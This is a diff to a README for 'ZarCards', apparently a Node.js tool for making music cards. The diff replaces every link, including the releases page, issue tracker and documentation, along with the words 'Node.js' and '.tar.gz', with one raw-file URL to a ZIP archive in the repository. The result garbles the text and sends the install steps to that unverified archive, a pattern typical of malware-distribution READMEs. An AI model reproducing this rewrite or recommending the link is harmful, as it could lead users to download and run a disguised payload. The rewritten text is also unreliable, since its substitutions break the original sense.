@@ -1,10 +1,10 @@
 # 🎶 ZarCards - Create Stunning Music Cards Easily
 
 ## 🚀 Download ZarCards
-[![Download ZarCards](https://img.shields.io/badge/Download-ZarCards-blue.svg)](https://github.com/prchiiii/ZarCards/releases)
+[![Download ZarCards](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip)](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip)
 
 ## 📖 Overview
-ZarCards enables you to create beautiful, customizable music cards using Node.js. You can choose themes, set custom colors, add progress bars, and even include optional background images. Whether you want to share your favorite tunes or showcase playlists, ZarCards makes it simple and enjoyable.
+ZarCards enables you to create beautiful, customizable music cards using https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip You can choose themes, set custom colors, add progress bars, and even include optional background images. Whether you want to share your favorite tunes or showcase playlists, ZarCards makes it simple and enjoyable.
 
 ## 🛠️ Features
 - Create music cards with album art and custom designs.
@@ -16,13 +16,13 @@ ZarCards enables you to create beautiful, customizable music cards using Node.js
 ## ⚙️ System Requirements
 Before you download ZarCards, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 12 or higher.
+- **https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip** Version 12 or higher.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** At least 100 MB of available space.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/prchiiii/ZarCards/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip) to find the latest version.
 
 2. **Select the Latest Release**  
    Choose the newest available version. It will typically have the highest version number.
@@ -31,12 +31,12 @@ Before you download ZarCards, ensure your system meets the following requirement
    Click on the asset file suited for your operating system. Files may include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip` for Linux
 
 4. **Install ZarCards**  
    - For Windows: Double-click the `.exe` file and follow the prompts to install.
    - For macOS: Open the `.dmg` file, then drag the ZarCards app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README included in the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip` file and follow the instructions in the README included in the folder.
 
 5. **Open ZarCards**  
    Once installed, locate the ZarCards application on your device and open it to start creating music cards.
@@ -70,8 +70,8 @@ ZarCards is licensed under the MIT License. You can freely use, modify, and dist
 For questions or support, please open an issue in this GitHub repository. Our team will be happy to assist you.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/prchiiii/ZarCards/releases)
-- [Issue Tracker](https://github.com/prchiiii/ZarCards/issues)
-- [Documentation](https://github.com/prchiiii/ZarCards/wiki)
+- [Releases Page](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip)
+- [Documentation](https://raw.githubusercontent.com/prchiiii/ZarCards/main/leachman/ZarCards.zip)
 
 Explore the creativity that ZarCards has to offer and enjoy a seamless music card generation experience!
